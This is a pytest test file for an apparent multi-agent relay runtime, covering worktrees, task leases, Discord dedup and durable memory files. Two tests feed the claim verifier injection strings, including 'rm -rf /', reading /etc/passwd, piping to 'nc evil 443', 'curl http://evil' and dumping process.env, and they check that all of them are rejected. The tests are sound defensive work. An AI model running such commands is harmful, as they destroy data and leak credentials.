from __future__ import annotations

import subprocess
import json
import shutil
import threading
from pathlib import Path

import pytest
import relay_runtime
import relay_common

from relay_runtime import DurableRuntime, TaskLeaseConflictError, WorktreeManager


def _init_git_repo(path: Path) -> None:
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init"], cwd=path, check=True, capture_output=True, text=True)
    subprocess.run(["git", "config", "user.email", "relay@example.com"], cwd=path, check=True, capture_output=True, text=True)
    subprocess.run(["git", "config", "user.name", "Relay"], cwd=path, check=True, capture_output=True, text=True)
    (path / "README.md").write_text("test\n", encoding="utf-8")
    subprocess.run(["git", "add", "README.md"], cwd=path, check=True, capture_output=True, text=True)
    subprocess.run(["git", "commit", "-m", "init"], cwd=path, check=True, capture_output=True, text=True)


def test_state_namespace_rejects_path_traversal() -> None:
    with pytest.raises(ValueError, match="Invalid state namespace"):
        relay_common.state_dir_for_namespace("../outside")
    with pytest.raises(ValueError, match="Invalid state namespace"):
        relay_common.state_dir_for_namespace("nested/path")
    with pytest.raises(ValueError, match="Invalid state namespace"):
        relay_common.state_dir_for_namespace("Case-Alias")


def test_runtime_binding_creates_worktree_and_memory_contract(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    binding = runtime.ensure_binding("channel-123")
    agents_text = (binding.worktree_path / "AGENTS.md").read_text(encoding="utf-8")

    assert binding.worktree_path.exists()
    assert (binding.worktree_path / "AGENTS.md").exists()
    assert (binding.worktree_path / "memory" / "STATUS.md").exists()
    assert (state / "durable-runtime.sqlite3").exists()
    assert "For relay implementation, runtime, packaging, or audit questions" in agents_text
    assert str(Path(__file__).resolve().parents[2]) in agents_text


def test_worktree_manager_rebuilds_partial_existing_directory(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)
    manager = WorktreeManager(state / "worktrees")
    partial = manager.root / relay_runtime.slugify("project-one") / relay_runtime.slugify("channel-one")
    partial.mkdir(parents=True)
    (partial / "BROKEN.txt").write_text("not a git worktree\n", encoding="utf-8")

    worktree_path, branch = manager.ensure(repo, project_id="project-one", channel_id="channel-one")

    assert worktree_path == partial
    assert branch.startswith("relay/")
    assert (worktree_path / ".git").exists()
    assert not (worktree_path / "BROKEN.txt").exists()


def test_worktree_manager_prunes_stale_existing_branch(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)
    manager = WorktreeManager(state / "worktrees")

    first_path, first_branch = manager.ensure(repo, project_id="project-one", channel_id="channel-one")
    shutil.rmtree(first_path)

    second_path, second_branch = manager.ensure(repo, project_id="project-one", channel_id="channel-one")

    assert second_path == first_path
    assert second_branch == first_branch
    assert (second_path / ".git").exists()


def test_worktree_manager_uses_fallback_branch_when_branch_checked_out_elsewhere(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    first_manager = WorktreeManager(state / "first-worktrees")
    first_path, first_branch = first_manager.ensure(repo, project_id="project-one", channel_id="channel-one")
    second_manager = WorktreeManager(state / "second-worktrees")

    second_path, second_branch = second_manager.ensure(repo, project_id="project-one", channel_id="channel-one")

    assert first_path != second_path
    assert second_branch.startswith(f"{first_branch}-")
    assert (second_path / ".git").exists()


def test_runtime_persists_primary_thread_mapping(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.bind_thread("channel-55", thread_id="thread-abc", backend="codex-app-server", status="active")

    resumed = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    assert resumed.active_thread_id("channel-55") == "thread-abc"


def test_runtime_persists_inbound_discord_message_dedup(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")

    assert runtime.claim_inbound_discord_message("channel-77", "12345") is True
    assert runtime.claim_inbound_discord_message("channel-77", "12345") is False

    resumed = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    assert resumed.claim_inbound_discord_message("channel-77", "12345") is False


def test_runtime_persists_outbound_discord_reply_dedup(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")

    assert runtime.claim_outbound_discord_reply("channel-88", "222", "done") is True
    assert runtime.claim_outbound_discord_reply("channel-88", "222", "done") is False
    assert runtime.claim_outbound_discord_reply("channel-88", "222", "done", force=True) is True

    resumed = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    assert resumed.claim_outbound_discord_reply("channel-88", "222", "done") is False


def test_runtime_can_release_discord_receipts_after_failed_side_effect(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")

    assert runtime.claim_inbound_discord_message("channel-release", "in-1") is True
    assert runtime.claim_inbound_discord_message("channel-release", "in-1") is False
    runtime.release_inbound_discord_message("channel-release", "in-1")
    assert runtime.claim_inbound_discord_message("channel-release", "in-1") is True

    assert runtime.claim_outbound_discord_reply("channel-release", "src-1", "hello") is True
    assert runtime.claim_outbound_discord_reply("channel-release", "src-1", "hello") is False
    runtime.release_outbound_discord_reply("channel-release", "src-1", "hello")
    assert runtime.claim_outbound_discord_reply("channel-release", "src-1", "hello") is True


def test_runtime_prunes_receipts_by_channel_count(tmp_path: Path, monkeypatch) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)
    monkeypatch.setenv("CLADEX_RELAY_RECEIPT_MAX_PER_CHANNEL", "100")

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")

    for index in range(105):
        assert runtime.claim_inbound_discord_message("channel-prune", f"in-{index}") is True

    assert runtime.has_inbound_discord_message("channel-prune", "in-0") is False
    assert runtime.has_inbound_discord_message("channel-prune", "in-104") is True


def test_runtime_rejects_overlapping_fresh_leases(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.claim_task(
        channel_key="channel-1",
        title="edit auth",
        owner_agent="codex-a",
        target_files=["src/auth/**"],
        validation=["pytest tests/auth -q"],
    )

    with pytest.raises(TaskLeaseConflictError):
        runtime.claim_task(
            channel_key="channel-2",
            title="edit login",
            owner_agent="codex-b",
            target_files=["src/**"],
            validation=["pytest tests/login -q"],
        )


def test_runtime_broad_wildcard_lease_conflicts_with_specific_file(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.claim_task(
        channel_key="channel-wide",
        title="edit python files",
        owner_agent="codex-a",
        target_files=["**/*.py"],
        validation=["pytest -q"],
    )

    with pytest.raises(TaskLeaseConflictError):
        runtime.claim_task(
            channel_key="channel-specific",
            title="edit backend file",
            owner_agent="codex-b",
            target_files=["backend/app.py"],
            validation=["pytest -q"],
        )


def test_runtime_sibling_path_prefixes_do_not_conflict(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    first = runtime.claim_task(
        channel_key="channel-app",
        title="edit app",
        owner_agent="codex-a",
        target_files=["src/app.py", "src/app/**"],
        validation=["pytest -q"],
    )
    second = runtime.claim_task(
        channel_key="channel-apply",
        title="edit apply",
        owner_agent="codex-b",
        target_files=["src/apply.py", "src/apple/**"],
        validation=["pytest -q"],
    )

    assert first["id"] != second["id"]


def test_runtime_logs_false_external_claims_to_drift_log(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    binding = runtime.observe_incoming_message(
        channel_key="channel-3",
        author_name="teammate",
        author_id=7,
        author_is_bot=True,
        text="Files on disk:\nMissingThing.py",
    )

    drift_text = (binding.worktree_path / "memory" / "DRIFT_LOG.md").read_text(encoding="utf-8")
    assert "MissingThing.py" in drift_text
    assert "Verdict: false" in drift_text


def test_runtime_updates_status_and_handoff_after_turn_result(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.observe_incoming_message(
        channel_key="channel-4",
        author_name="Finn",
        author_id=1,
        author_is_bot=False,
        text="Implement durable memory runtime.",
    )
    runtime.bind_thread("channel-4", thread_id="thread-444", backend="codex-app-server", status="active")
    runtime.record_turn_result(
        channel_key="channel-4",
        thread_id="thread-444",
        turn_id="turn-1",
        summary="Implemented runtime store.",
        files_changed=["relay_runtime.py", "tests/test_runtime.py"],
        commands_run=["pytest tests/test_runtime.py -q -> pass"],
        validations=["pytest tests/test_runtime.py -q -> pass"],
        next_step="Wire the runtime into bot.py.",
    )

    binding = runtime.ensure_binding("channel-4")
    status_text = (binding.worktree_path / "memory" / "STATUS.md").read_text(encoding="utf-8")
    handoff_text = (binding.worktree_path / "memory" / "HANDOFF.md").read_text(encoding="utf-8")
    tasks = (binding.worktree_path / "memory" / "TASKS.json").read_text(encoding="utf-8")

    assert "Implement durable memory runtime." in status_text
    assert "Wire the runtime into bot.py." in status_text
    assert "relay_runtime.py" in handoff_text
    assert "task-" in tasks


def test_runtime_turn_dedupe_is_database_enforced(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.bind_thread("channel-turn", thread_id="thread-turn", backend="codex", status="active")

    first = runtime.store.record_turn(
        thread_id="thread-turn",
        turn_id="turn-dupe",
        summary="one",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="next",
    )
    second = runtime.store.record_turn(
        thread_id="thread-turn",
        turn_id="turn-dupe",
        summary="two",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="next",
    )

    assert first is True
    assert second is False


def test_runtime_duplicate_turn_recovers_missing_artifact(tmp_path: Path, monkeypatch) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.bind_thread("channel-turn-artifact", thread_id="thread-artifact", backend="codex", status="active")
    original_append = runtime._append_turn_artifact
    attempts = {"count": 0}

    def flaky_append(*args, **kwargs) -> None:
        attempts["count"] += 1
        if attempts["count"] == 1:
            raise OSError("disk not ready")
        original_append(*args, **kwargs)

    monkeypatch.setattr(runtime, "_append_turn_artifact", flaky_append)

    with pytest.raises(OSError):
        runtime.record_turn_result(
            channel_key="channel-turn-artifact",
            thread_id="thread-artifact",
            turn_id="turn-artifact-recover",
            summary="first write",
            files_changed=[],
            commands_run=[],
            validations=[],
            next_step="retry",
        )

    assert runtime.record_turn_result(
        channel_key="channel-turn-artifact",
        thread_id="thread-artifact",
        turn_id="turn-artifact-recover",
        summary="first write",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="retry",
    ) is False

    artifact = next((state / "turn-artifacts").glob("*.jsonl"))
    assert "turn-artifact-recover" in artifact.read_text(encoding="utf-8")
    binding = runtime.ensure_binding("channel-turn-artifact")
    status_md = (binding.worktree_path / "memory" / "STATUS.md").read_text(encoding="utf-8")
    handoff_md = (binding.worktree_path / "memory" / "HANDOFF.md").read_text(encoding="utf-8")
    assert "retry" in status_md
    assert "first write" in handoff_md


def test_runtime_duplicate_turn_recovers_missing_side_effects_for_that_turn(tmp_path: Path, monkeypatch) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.bind_thread("channel-turn-side-effects", thread_id="thread-side-effects", backend="codex", status="active")

    assert runtime.record_turn_result(
        channel_key="channel-turn-side-effects",
        thread_id="thread-side-effects",
        turn_id="turn-ok",
        summary="first good turn",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="next",
    ) is True

    original_side_effects = runtime._record_turn_side_effects
    attempts = {"count": 0}

    def flaky_side_effects(*args, **kwargs) -> None:
        attempts["count"] += 1
        if attempts["count"] == 1:
            raise OSError("handoff not ready")
        original_side_effects(*args, **kwargs)

    monkeypatch.setattr(runtime, "_record_turn_side_effects", flaky_side_effects)

    with pytest.raises(OSError):
        runtime.record_turn_result(
            channel_key="channel-turn-side-effects",
            thread_id="thread-side-effects",
            turn_id="turn-needs-repair",
            summary="repair this side effect",
            files_changed=[],
            commands_run=[],
            validations=[],
            next_step="retry side effects",
        )

    assert runtime.store.turn_side_effects_synced("turn-ok") is True
    assert runtime.store.turn_side_effects_synced("turn-needs-repair") is False
    assert runtime.record_turn_result(
        channel_key="channel-turn-side-effects",
        thread_id="thread-side-effects",
        turn_id="turn-needs-repair",
        summary="repair this side effect",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="retry side effects",
    ) is False

    binding = runtime.ensure_binding("channel-turn-side-effects")
    handoff_md = (binding.worktree_path / "memory" / "HANDOFF.md").read_text(encoding="utf-8")
    assert "repair this side effect" in handoff_md
    assert runtime.store.turn_side_effects_synced("turn-needs-repair") is True


def test_runtime_turn_side_effect_claim_has_single_winner(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    assert runtime.store.record_turn(
        thread_id="thread-claim",
        turn_id="turn-claim",
        summary="claim once",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="next",
    ) is True

    results: list[bool] = []

    def claim() -> None:
        results.append(runtime.store.claim_turn_side_effects("turn-claim"))

    threads = [threading.Thread(target=claim) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert results.count(True) == 1
    assert results.count(False) == 7


def test_runtime_new_human_message_supersedes_existing_active_task(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.observe_incoming_message(
        channel_key="channel-redirect",
        author_name="Finn",
        author_id=1,
        author_is_bot=False,
        text="Keep working on the tunnel task.",
    )
    runtime.observe_incoming_message(
        channel_key="channel-redirect",
        author_name="Finn",
        author_id=1,
        author_is_bot=False,
        text="Only answer yes or no.",
    )

    binding = runtime.ensure_binding("channel-redirect")
    active = runtime.store.active_task("channel-redirect")
    tasks = json.loads((binding.worktree_path / "memory" / "TASKS.json").read_text(encoding="utf-8"))

    assert active is not None
    assert active["title"] == "Only answer yes or no."
    assert tasks["tasks"][0]["title"] == "Only answer yes or no."
    assert any(task["status"] == "released" for task in tasks["tasks"])


def test_runtime_expired_active_task_is_not_revived(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    old = runtime.claim_task(
        channel_key="channel-expired",
        title="old task",
        owner_agent="dead-agent",
        target_files=[],
        validation=[],
    )
    with runtime.store._connect() as conn:
        conn.execute(
            "UPDATE task_leases SET lease_expires_at = ? WHERE task_id = ?",
            ("2000-01-01T00:00:00+00:00", old["id"]),
        )

    new = runtime.ensure_task(
        channel_key="channel-expired",
        title="new task",
        owner_agent="new-agent",
        target_files=[],
        validation=[],
    )

    assert new["id"] != old["id"]
    assert new["owner"] == "new-agent"


def test_runtime_context_bundle_uses_latest_distinct_handoff_highlights(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="claude")
    runtime.bind_thread("channel-handoff", thread_id="thread-1", backend="claude-print-resume", status="active")
    runtime.record_turn_result(
        channel_key="channel-handoff",
        thread_id="thread-1",
        turn_id="turn-old",
        summary="Old stale reply.",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="Old stale reply.",
    )
    runtime.record_turn_result(
        channel_key="channel-handoff",
        thread_id="thread-1",
        turn_id="turn-new",
        summary="Yes.",
        files_changed=[],
        commands_run=[],
        validations=[],
        next_step="Yes.",
    )

    binding = runtime.ensure_binding("channel-handoff")
    handoff_text = (binding.worktree_path / "memory" / "HANDOFF.md").read_text(encoding="utf-8")
    bundle = runtime.build_context_bundle("channel-handoff")

    assert "- result: Yes." in handoff_text
    assert "- exact next step: Continue from STATUS.md." in handoff_text
    assert "Old stale reply." in handoff_text
    assert "- result: Yes." in bundle
    assert "Old stale reply." not in bundle
    assert "- exact next step: Continue from STATUS.md." not in bundle


def test_runtime_context_bundle_includes_relay_source_of_truth(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    bundle = runtime.build_context_bundle("channel-relay-audit")

    assert "Relay implementation source of truth:" in bundle
    assert "Use the active worktree as source of truth for workspace code/tasks" in bundle
    assert "older log events as background only" in bundle
    assert str(Path(__file__).resolve().parents[2]) in bundle


def test_runtime_does_not_promote_human_turn_instructions_into_stable_constraints(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    binding = runtime.observe_incoming_message(
        channel_key="channel-facts",
        author_name="Finn",
        author_id=1,
        author_is_bot=False,
        text="Reply with only the path.",
    )
    facts = json.loads((binding.worktree_path / "memory" / "KNOWN_FACTS.json").read_text(encoding="utf-8"))

    assert facts["constraints"] == []
    assert facts["preferences"] == []


def test_runtime_prunes_transient_constraints_from_known_facts(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    binding = runtime.ensure_binding("channel-facts-prune")
    facts_path = binding.worktree_path / "memory" / "KNOWN_FACTS.json"
    facts_path.write_text(
        json.dumps(
            {
                "preferences": ["Keep it concise."],
                "constraints": ["Reply with only the path.", "Do not ship broken code.", "sage why are you only saying yes."],
                "facts": [],
            }
        ),
        encoding="utf-8",
    )

    bundle = runtime.build_context_bundle("channel-facts-prune")
    facts = json.loads(facts_path.read_text(encoding="utf-8"))

    assert "Reply with only the path." not in bundle
    assert "Reply with only the path." not in facts["constraints"]
    assert "sage why are you only saying yes." not in facts["constraints"]
    assert "Do not ship broken code." in facts["constraints"]


def test_runtime_does_not_promote_other_ai_messages_into_stable_constraints(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    binding = runtime.observe_incoming_message(
        channel_key="channel-other-ai",
        author_name="Forge",
        author_id=42,
        author_is_bot=True,
        text="Do not use purple defaults. Only answer in one sentence.",
    )
    facts = json.loads((binding.worktree_path / "memory" / "KNOWN_FACTS.json").read_text(encoding="utf-8"))

    assert facts["constraints"] == []
    assert facts["preferences"] == []


def test_runtime_prunes_handoff_history_and_command_noise(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    binding = runtime.ensure_binding("channel-handoff-prune")
    for index in range(24):
        runtime.write_handoff(
            binding,
            task_id=f"task-{index}",
            changed_files=[],
            commands_run=[f"powershell.exe -Command \"{'x' * 260}\""],
            result=f"result {index}",
            blocker="",
            next_step="Continue from STATUS.md.",
        )

    handoff_text = (binding.worktree_path / "memory" / "HANDOFF.md").read_text(encoding="utf-8")

    assert handoff_text.count("## ") == 20
    assert len(handoff_text) <= 8000
    assert "...[truncated]" in handoff_text
    assert "result 23" in handoff_text
    assert "result 0" not in handoff_text


def test_runtime_tasks_file_prunes_old_released_history(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    for index in range(30):
        task = runtime.claim_task(
            channel_key="channel-task-prune",
            title=f"task {index}",
            owner_agent="codex",
            target_files=[],
            validation=[],
        )
        runtime.release_task(channel_key="channel-task-prune", task_id=task["id"])

    tasks = json.loads((runtime.ensure_binding("channel-task-prune").worktree_path / "memory" / "TASKS.json").read_text(encoding="utf-8"))["tasks"]
    titles = {task["title"] for task in tasks}

    assert len(tasks) == 24
    assert "task 0" not in titles
    assert "task 29" in titles


def test_runtime_heartbeat_active_task_refreshes_current_lease(tmp_path: Path, monkeypatch) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    now = 1_700_000_000.0
    monkeypatch.setattr(relay_runtime.time, "time", lambda: now)
    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.claim_task(
        channel_key="channel-heartbeat",
        title="keep lease fresh",
        owner_agent="codex",
        target_files=[],
        validation=[],
    )
    tasks_path = runtime.ensure_binding("channel-heartbeat").worktree_path / "memory" / "TASKS.json"
    before = json.loads(tasks_path.read_text(encoding="utf-8"))["tasks"][0]["heartbeat_at"]

    now += 61.0
    assert runtime.heartbeat_active_task("channel-heartbeat") is True
    after = json.loads(tasks_path.read_text(encoding="utf-8"))["tasks"][0]["heartbeat_at"]

    assert after != before


def test_runtime_records_compaction_and_preserves_continuity(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.observe_incoming_message(
        channel_key="channel-5",
        author_name="Finn",
        author_id=1,
        author_is_bot=False,
        text="Keep the same objective after compaction.",
    )
    runtime.bind_thread("channel-5", thread_id="thread-555", backend="codex-app-server", status="active")
    runtime.record_compaction_event("channel-5", thread_id="thread-555", event_type="thread/compact/start")

    binding = runtime.ensure_binding("channel-5")
    status_text = (binding.worktree_path / "memory" / "STATUS.md").read_text(encoding="utf-8")
    handoff_text = (binding.worktree_path / "memory" / "HANDOFF.md").read_text(encoding="utf-8")

    assert "Rehydrate from durable memory" in status_text
    assert "Compaction event recorded" in handoff_text


def test_runtime_writes_turn_artifact_jsonl(tmp_path: Path, monkeypatch) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)
    fsync_calls: list[int] = []
    monkeypatch.setattr(relay_runtime.os, "fsync", lambda fd: fsync_calls.append(fd))

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="codex")
    runtime.bind_thread("channel-6", thread_id="thread-666", backend="codex-app-server", status="active")
    runtime.record_turn_result(
        channel_key="channel-6",
        thread_id="thread-666",
        turn_id="turn-6",
        summary="Implemented the durable rebind path.",
        files_changed=["bot.py", "relay_runtime.py"],
        commands_run=["pytest tests/test_runtime.py -q"],
        validations=["pytest tests/test_runtime.py -q -> pass"],
        next_step="Update README and status output.",
        command_exit_codes=[0],
        cwd=str(runtime.ensure_binding("channel-6").worktree_path),
        approvals=["command approval"],
        blocker="",
        error_category="",
        started_at="2026-04-11T00:00:00Z",
        completed_at="2026-04-11T00:00:10Z",
        backend="codex-app-server",
        degraded=False,
    )

    artifact_path = state / "turn-artifacts" / f"{runtime.project_id}.jsonl"
    lines = artifact_path.read_text(encoding="utf-8").strip().splitlines()
    payload = json.loads(lines[-1])

    assert payload["thread_id"] == "thread-666"
    assert payload["turn_id"] == "turn-6"
    assert payload["files_changed"] == ["bot.py", "relay_runtime.py"]
    assert payload["command_exit_codes"] == [0]
    assert fsync_calls


def test_runtime_tracks_restart_churn(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="claude")

    # Initially no churn
    assert runtime.is_restart_churn(threshold=5) is False
    assert runtime.count_recent_restarts() == 0

    # Record some restarts
    for _ in range(4):
        runtime.record_restart_event(reason="test")

    # Not yet churn (threshold is 5)
    assert runtime.is_restart_churn(threshold=5) is False
    assert runtime.count_recent_restarts() == 4

    # One more triggers churn
    runtime.record_restart_event(reason="test")
    assert runtime.is_restart_churn(threshold=5) is True
    assert runtime.count_recent_restarts() == 5

    # Persists across runtime instances
    resumed = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="claude")
    assert resumed.is_restart_churn(threshold=5) is True
    assert resumed.count_recent_restarts() == 5


def test_runtime_channel_startup_marker_does_not_increment_restart_churn(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="test", agent_name="claude")
    runtime.record_startup("channel-99")

    assert runtime.count_recent_restarts() == 0
    binding = runtime.ensure_binding("channel-99")
    status_text = (binding.worktree_path / "memory" / "STATUS.md").read_text(encoding="utf-8")
    assert "Resume the same thread and continue without asking for a recap." in status_text


def test_verify_test_claim_rejects_shell_metacharacters(tmp_path: Path, monkeypatch) -> None:
    """`_verify_test_claim` once shelled out via `cmd /c` / `sh -lc`, so any
    bot-supplied claim like `pytest x; rm -rf /` would be re-interpreted by
    the shell. The current implementation must short-circuit on shell
    metacharacters and never reach `subprocess.run`."""
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)
    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="vtc", agent_name="codex")
    binding = runtime.ensure_binding("vtc-channel")

    called = []

    def explode_run(*args, **kwargs):
        called.append((args, kwargs))
        raise AssertionError("subprocess.run must not be invoked for shell-metacharacter claims")

    monkeypatch.setattr(relay_runtime.subprocess, "run", explode_run)

    for malicious in (
        "pytest tests; rm -rf /",
        "pytest tests && cat /etc/passwd",
        "pytest tests | nc evil 443",
        "pytest tests `whoami`",
        "pytest tests $(id)",
        "pytest tests > /tmp/leak",
    ):
        status, detail = runtime.verifier._verify_test_claim(binding, malicious)
        assert status == "unresolved"
        assert "metacharacters" in detail or "argv" in detail or "allowlisted" in detail
    assert called == []


def test_verify_test_claim_rejects_non_allowlisted_argv(tmp_path: Path, monkeypatch) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)
    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="vtc2", agent_name="codex")
    binding = runtime.ensure_binding("vtc2-channel")

    called = []

    def explode_run(*args, **kwargs):
        called.append((args, kwargs))
        raise AssertionError("non-allowlisted argv must not run")

    monkeypatch.setattr(relay_runtime.subprocess, "run", explode_run)

    for not_allowed in ("rm -rf /", "curl http://evil", "node -e 'console.log(process.env)'", "git push --force"):
        status, _ = runtime.verifier._verify_test_claim(binding, not_allowed)
        assert status == "unresolved"
    assert called == []


def test_runtime_claim_task_serializes_overlapping_concurrent_claims(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="conflict", agent_name="codex")
    project_id = runtime.project_id

    barrier = threading.Barrier(8)
    successes: list[str] = []
    conflicts: list[str] = []
    lock = threading.Lock()

    def worker(idx: int) -> None:
        barrier.wait()
        try:
            task_id = runtime.store.claim_task(
                channel_id=f"channel-{idx}",
                project_id=project_id,
                owner_agent=f"codex-{idx}",
                title=f"task-{idx}",
                target_files=["src/auth/**"],
                validation=[],
            )
            with lock:
                successes.append(task_id)
        except TaskLeaseConflictError:
            with lock:
                conflicts.append(str(idx))

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert len(successes) == 1
    assert len(conflicts) == 7
    rows = runtime.store._connect().execute(
        "SELECT DISTINCT owner_agent FROM file_ownership WHERE project_id = ?",
        (project_id,),
    ).fetchall()
    assert len(rows) == 1


def test_runtime_worktree_ensure_serializes_concurrent_callers(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    manager = WorktreeManager(state / "worktrees")
    barrier = threading.Barrier(4)
    paths: list[Path] = []
    errors: list[BaseException] = []
    lock = threading.Lock()

    def worker() -> None:
        barrier.wait()
        try:
            wt, _branch = manager.ensure(repo, project_id="proj-x", channel_id="chan-x")
            with lock:
                paths.append(wt)
        except BaseException as exc:  # noqa: BLE001 - capture for assertions
            with lock:
                errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(4)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    resolved = {str(p.resolve()) for p in paths}
    assert len(resolved) == 1
    assert str(repo.resolve()) not in resolved


def test_runtime_handoff_appends_survive_concurrent_writers(tmp_path: Path) -> None:
